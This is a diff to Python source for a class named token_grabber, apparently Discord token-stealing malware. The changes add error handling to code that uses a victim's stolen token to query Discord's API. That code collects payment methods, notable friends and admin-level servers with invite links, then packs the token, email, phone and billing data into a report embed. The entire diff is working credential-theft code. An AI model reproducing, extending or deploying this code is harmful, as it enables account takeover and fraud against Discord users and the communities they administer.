@@ -126,9 +126,9 @@ class token_grabber():
                 try:
                     for method in b.json():
                         if method['type'] == 1:
-                            methods += "💳"
-                        elif method['type'] == 0:
-                            methods += "<:paypal:973417655627288666>"
+                            methods += "💳 "
+                        elif method['type'] == 2:
+                            methods += "<:paypal:973417655627288666> "
                         else:
                             methods += "❓"
                 except TypeError:
@@ -141,21 +141,25 @@ class token_grabber():
             })
    
             hq_friends = ""
-            for friend in f.json():
-                prefered_flags = [1, 2 ,4, 8, 512, 16384, 131072]
-                if friend['user']['public_flags'] in prefered_flags:
-                    hq_badges = ""
-                    flags = friend['user']['public_flags']
-                    if (flags == 1): hq_badges += f"{emoji_staff}, "
-                    if (flags == 2): hq_badges += f"{emoji_partner}, "
-                    if (flags == 4): hq_badges += f"{emoji_hypesquad_event}, "
-                    if (flags == 8): hq_badges += f"{emoji_green_bughunter}, "
-                    if (flags == 512): hq_badges += f"{emoji_early_supporter}, "
-                    if (flags == 16384): hq_badges += f"{emoji_gold_bughunter}, "
-                    if (flags == 131072): hq_badges += f"{emoji_verified_bot_developer}, "
-                    if hq_badges.endswith(", "): hq_badges = hq_badges[:-2]
-     
-                    hq_friends += f"{hq_badges} - `{friend['user']['username']}#{friend['user']['discriminator']} ({friend['user']['id']})`\n"
+            try:
+                for friend in f.json():
+                    prefered_flags = [1, 2 ,4, 8, 512, 16384, 131072]
+                    if friend['user']['public_flags'] in prefered_flags:
+                        hq_badges = ""
+                        flags = friend['user']['public_flags']
+                        if (flags == 1): hq_badges += f"{emoji_staff}, "
+                        if (flags == 2): hq_badges += f"{emoji_partner}, "
+                        if (flags == 4): hq_badges += f"{emoji_hypesquad_event}, "
+                        if (flags == 8): hq_badges += f"{emoji_green_bughunter}, "
+                        if (flags == 512): hq_badges += f"{emoji_early_supporter}, "
+                        if (flags == 16384): hq_badges += f"{emoji_gold_bughunter}, "
+                        if (flags == 131072): hq_badges += f"{emoji_verified_bot_developer}, "
+                        if hq_badges.endswith(", "): hq_badges = hq_badges[:-2]
+
+                        hq_friends += f"{hq_badges} - `{friend['user']['username']}#{friend['user']['discriminator']} ({friend['user']['id']})`\n"
+            except TypeError:
+                pass
+                #hq_friends = "No HQ Friends Found"
 
             g = requests.get("https://discord.com/api/v9/users/@me/guilds?with_counts=true", headers={
                 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
@@ -164,25 +168,27 @@ class token_grabber():
             })
             
             hq_guilds = ""
-            for guild in g.json():
-                admin = True if guild['permissions'] == '4398046511103' else False
-                if admin and guild['approximate_member_count'] >= 50:
-                    i = requests.get(f"https://discord.com/api/v9/guilds/{guild['id']}/invites", headers={
-                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
-                        'Content-Type': 'application/json',
-                        'Authorization': token,
-                    })
-                    
-                    if guild['owner']:
-                        owner = " ✅ "
-                    else:
-                        owner = "❌"
-                    
-                    if len(i.json()) > 1:
-                        hq_guilds += f"\u200b\n**{guild['name']} / ({guild['id']})** \n Owner: `{owner}` | Admin: ` ✅ ` | Members: ` ⚫ {guild['approximate_member_count']} / 🟢 {guild['approximate_presence_count']} / 🔴 {guild['approximate_member_count'] - guild['approximate_presence_count']} `\n[Join {guild['name']}](https://discord.com/invite/{i.json()[0]['code']})\n"
-                    else:
-                        hq_guilds += f"\u200b\n**{guild['name']} / ({guild['id']})** \n Owner: `{owner}` | Admin: ` ✅ ` | Members: ` ⚫ {guild['approximate_member_count']} / 🟢 {guild['approximate_presence_count']} / 🔴 {guild['approximate_member_count'] - guild['approximate_presence_count']} `\nNo invite code could be found for this guild\n"
+            try:
+                for guild in g.json():
+                    admin = True if guild['permissions'] == '4398046511103' else False
+                    if admin and guild['approximate_member_count'] >= 50:
+                        i = requests.get(f"https://discord.com/api/v9/guilds/{guild['id']}/invites", headers={
+                            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
+                            'Content-Type': 'application/json',
+                            'Authorization': token,
+                        })
 
+                        if guild['owner']:
+                            owner = " ✅ "
+                        else:
+                            owner = "❌"
+
+                        if len(i.json()) > 1:
+                            hq_guilds += f"\u200b\n**{guild['name']} / ({guild['id']})** \n Owner: `{owner}` | Admin: ` ✅ ` | Members: ` ⚫ {guild['approximate_member_count']} / 🟢 {guild['approximate_presence_count']} / 🔴 {guild['approximate_member_count'] - guild['approximate_presence_count']} `\n[Join {guild['name']}](https://discord.com/invite/{i.json()[0]['code']})\n"
+                        else:
+                            hq_guilds += f"\u200b\n**{guild['name']} / ({guild['id']})** \n Owner: `{owner}` | Admin: ` ✅ ` | Members: ` ⚫ {guild['approximate_member_count']} / 🟢 {guild['approximate_presence_count']} / 🔴 {guild['approximate_member_count'] - guild['approximate_presence_count']} `\nNo invite code could be found for this guild\n"
+            except TypeError:
+                pass            
                 
             
             embed.add_field(name=f"**{username} ({user_id})**", value=f"```{token}```\n***Email >*** `{email}`\n***Phone >*** `{phone}`\n***Nitro >*** `{nitro}`\n***Billing >*** {methods}\n***Badges >*** {badges}\n\u200b", inline=False)
